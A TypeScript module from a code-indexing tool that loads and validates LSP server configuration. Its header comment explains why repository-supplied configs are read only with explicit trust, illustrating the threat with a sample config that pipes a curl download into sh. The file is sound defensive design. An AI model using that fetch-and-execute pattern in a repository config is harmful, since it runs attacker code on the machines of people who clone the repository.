// Where the LSP tier is configured, and why it lives where it lives.
//
// THE PATH IS THE POINT. This config sits at `<repo>/.codeindex/lsp.json`, not
// at the repository root, because `.codeindex` is in walk.ts's IGNORE_DIRS. A
// root-level `codeindex.lsp.json` would be a WALKED FILE: its mere presence
// would add a record to the scan and change the bytes of graph.json. Putting it
// under an already-ignored directory is what makes "the LSP tier cannot alter
// the artifacts" unconditional rather than "unconditional unless you put the
// config somewhere the walker can see it".
//
// There is deliberately NO built-in server table. A default of
// `typescript → typescript-language-server --stdio` would activate itself on
// any machine where that binary happens to be installed, so the same repo would
// answer differently depending on what someone once ran `npm i -g` for.
// Presence of this file IS the opt-in — the same doctrine as the embedding
// tier, where a model.json on disk is what turns the tier on.
//
// TRUST. A config names a command to SPAWN, with its arguments and its
// environment. A repository's own `.codeindex/lsp.json` is therefore code the
// repository runs on the reader's machine: a cloned untrusted repo could commit
// `{"command": "sh", "args": ["-c", "curl … | sh"]}` and wait for `refs --lsp`
// or an agent's `find_references` call. So the config inside a repository (or
// the working directory) is read only when the caller says so —
// `--trust-lsp-config` or CODEINDEX_TRUST_LSP_CONFIG=1. Without it, only the
// configs the user put there themselves count: CODEINDEX_LSP_CONFIG and the
// per-user file (~/.config/codeindex/lsp.json, or under $XDG_CONFIG_HOME). An
// untrusted repo config is reported as `ignored`, never silently dropped.

import { existsSync, readFileSync } from "node:fs";
import { homedir } from "node:os";
import { join, resolve } from "node:path";

export interface LspServerConfig {
  /** Stable id, used in `source` labels and in `lsp status`. */
  id: string;
  /** Engine `lang` strings (see src/lang/registry.ts), not LSP language ids. */
  languages: string[];
  /** What `didOpen` announces. Defaults to each declaration's language. */
  languageId?: string;
  command: string;
  args?: string[];
  env?: Record<string, string>;
  initializationOptions?: unknown;
  /** Per-request budget, ms (default 5000). */
  timeoutMs?: number;
  /** How long `initialize` may take, ms (default 15000). */
  startupTimeoutMs?: number;
}

export interface LspConfig {
  version: 1;
  servers: LspServerConfig[];
}

export const LSP_CONFIG_NAME = "lsp.json";
export const LSP_CONFIG_DIR = ".codeindex";

export type LspConfigSource = "env" | "repo" | "cwd" | "user" | "none";

export interface ResolvedLspConfigPath {
  path: string | undefined;
  source: LspConfigSource;
  /** A repo (or cwd) config left unread because it was not trusted. */
  ignored?: string;
}

/** Whether a repository may configure the commands the LSP tier spawns. */
export interface LspTrust {
  /** `--trust-lsp-config`; CODEINDEX_TRUST_LSP_CONFIG=1 grants it too. */
  trustRepoConfig?: boolean;
}

export const LSP_TRUST_HINT =
  "a repository's lsp.json names commands to run, so it is read only with --trust-lsp-config or CODEINDEX_TRUST_LSP_CONFIG=1";

export function repoLspConfigTrusted(trust: LspTrust = {}): boolean {
  if (trust.trustRepoConfig === true) return true;
  const env = (process.env.CODEINDEX_TRUST_LSP_CONFIG ?? "").trim().toLowerCase();
  return env === "1" || env === "true" || env === "yes";
}

/** The per-user config: $XDG_CONFIG_HOME/codeindex/lsp.json, else ~/.config/…. */
export function userLspConfigPath(): string {
  const xdg = process.env.XDG_CONFIG_HOME?.trim();
  return join(xdg ? resolve(xdg) : join(homedir(), ".config"), "codeindex", LSP_CONFIG_NAME);
}

/**
 * Resolution ladder: an explicit env var wins outright; then the repo, then
 * the working directory — both only when trusted (see TRUST above); then the
 * per-user config.
 *
 * `CODEINDEX_LSP_CONFIG` set to an empty string, `0` or `off` DISABLES the tier
 * even when a repo config exists — the escape hatch for a CI job that must not
 * spawn anything, without deleting a file the rest of the team relies on.
 */
export function resolveLspConfigPath(repo: string, trust: LspTrust = {}): ResolvedLspConfigPath {
  const env = process.env.CODEINDEX_LSP_CONFIG;
  if (env !== undefined) {
    const trimmed = env.trim();
    if (!trimmed || trimmed === "0" || trimmed.toLowerCase() === "off") return { path: undefined, source: "none" };
    return { path: resolve(trimmed), source: "env" };
  }
  const trusted = repoLspConfigTrusted(trust);
  let ignored: string | undefined;
  const inRepo = join(repo, LSP_CONFIG_DIR, LSP_CONFIG_NAME);
  const inCwd = join(process.cwd(), LSP_CONFIG_DIR, LSP_CONFIG_NAME);
  for (const [path, source] of [[inRepo, "repo"], [inCwd, "cwd"]] as const) {
    if (source === "cwd" && path === inRepo) continue;
    if (!existsSync(path)) continue;
    if (trusted) return { path, source };
    ignored ??= path;
  }
  const user = userLspConfigPath();
  if (existsSync(user)) return { path: user, source: "user", ...(ignored ? { ignored } : {}) };
  return { path: undefined, source: "none", ...(ignored ? { ignored } : {}) };
}

/** Validate a parsed payload, throwing with the field that is wrong. */
export function parseLspConfig(payload: unknown): LspConfig {
  if (!payload || typeof payload !== "object") throw new Error("lsp.json must be a JSON object");
  const raw = payload as { version?: unknown; servers?: unknown };
  if (raw.version !== 1) throw new Error(`lsp.json: unsupported version ${JSON.stringify(raw.version)} (expected 1)`);
  if (!Array.isArray(raw.servers)) throw new Error("lsp.json: `servers` must be an array");

  const ids = new Set<string>();
  const servers = raw.servers.map((entry, i) => {
    if (!entry || typeof entry !== "object") throw new Error(`lsp.json: servers[${i}] must be an object`);
    const s = entry as Record<string, unknown>;
    const id = typeof s.id === "string" && s.id.trim() ? s.id.trim() : undefined;
    if (!id) throw new Error(`lsp.json: servers[${i}].id must be a non-empty string`);
    // Ids label results, so a duplicate would make two servers' answers
    // indistinguishable in exactly the field meant to tell them apart.
    if (ids.has(id)) throw new Error(`lsp.json: duplicate server id ${JSON.stringify(id)}`);
    ids.add(id);
    if (typeof s.command !== "string" || !s.command.trim()) throw new Error(`lsp.json: servers[${i}].command must be a non-empty string`);
    if (!Array.isArray(s.languages) || !s.languages.length || s.languages.some((l) => typeof l !== "string")) {
      throw new Error(`lsp.json: servers[${i}].languages must be a non-empty array of strings`);
    }
    if (s.args !== undefined && (!Array.isArray(s.args) || s.args.some((a) => typeof a !== "string"))) {
      throw new Error(`lsp.json: servers[${i}].args must be an array of strings`);
    }
    return {
      id,
      languages: s.languages as string[],
      ...(typeof s.languageId === "string" ? { languageId: s.languageId } : {}),
      command: s.command,
      ...(Array.isArray(s.args) ? { args: s.args as string[] } : {}),
      ...(s.env && typeof s.env === "object" ? { env: s.env as Record<string, string> } : {}),
      ...(s.initializationOptions !== undefined ? { initializationOptions: s.initializationOptions } : {}),
      ...(s.timeoutMs !== undefined ? { timeoutMs: positiveMs(s.timeoutMs, `servers[${i}].timeoutMs`) } : {}),
      ...(s.startupTimeoutMs !== undefined ? { startupTimeoutMs: positiveMs(s.startupTimeoutMs, `servers[${i}].startupTimeoutMs`) } : {}),
    } satisfies LspServerConfig;
  });

  return { version: 1, servers };
}

// A budget of 0 or less timed out every request before it was sent.
function positiveMs(value: unknown, field: string): number {
  if (typeof value !== "number" || !Number.isFinite(value) || value <= 0) {
    throw new Error(`lsp.json: ${field} must be a positive number of milliseconds, got ${JSON.stringify(value)}`);
  }
  return value;
}

/**
 * The config for a repository, or undefined when the tier was not asked for.
 *
 * NEVER THROWS on an absent file — absent is the normal case and must cost
 * nothing. A file that exists but is malformed DOES throw, because at that
 * point someone asked for the tier and silently ignoring their config is worse
 * than failing: they would spend the afternoon wondering why nothing improved.
 */
export function loadLspConfig(repo: string, trust: LspTrust = {}): LspConfig | undefined {
  const { path } = resolveLspConfigPath(repo, trust);
  if (!path || !existsSync(path)) return undefined;
  let payload: unknown;
  try {
    payload = JSON.parse(readFileSync(path, "utf8"));
  } catch (e) {
    throw new Error(`${path}: ${e instanceof Error ? e.message : String(e)}`);
  }
  return parseLspConfig(payload);
}

/** The server that claims a language, or undefined. First match wins. */
export function serverForLang(config: LspConfig, lang: string): LspServerConfig | undefined {
  return config.servers.find((s) => s.languages.includes(lang));
}

export const DEFAULT_TIMEOUT_MS = 5000;
export const DEFAULT_STARTUP_TIMEOUT_MS = 15000;

/**
 * Per-request budget: the env override first, then the server's config, then
 * the default. The env var wins so an operator (a CI job, a slow machine) can
 * retune every server without editing an lsp.json the team shares.
 */
export function timeoutFor(server: LspServerConfig): number {
  return positiveEnv("CODEINDEX_LSP_TIMEOUT_MS") ?? server.timeoutMs ?? DEFAULT_TIMEOUT_MS;
}

/** The `initialize` budget, with the same precedence as timeoutFor. */
export function startupTimeoutFor(server: LspServerConfig): number {
  return positiveEnv("CODEINDEX_LSP_STARTUP_TIMEOUT_MS") ?? server.startupTimeoutMs ?? DEFAULT_STARTUP_TIMEOUT_MS;
}

function positiveEnv(name: string): number | undefined {
  const raw = process.env[name];
  if (raw === undefined) return undefined;
  const value = Number(raw);
  return Number.isFinite(value) && value > 0 ? value : undefined;
}
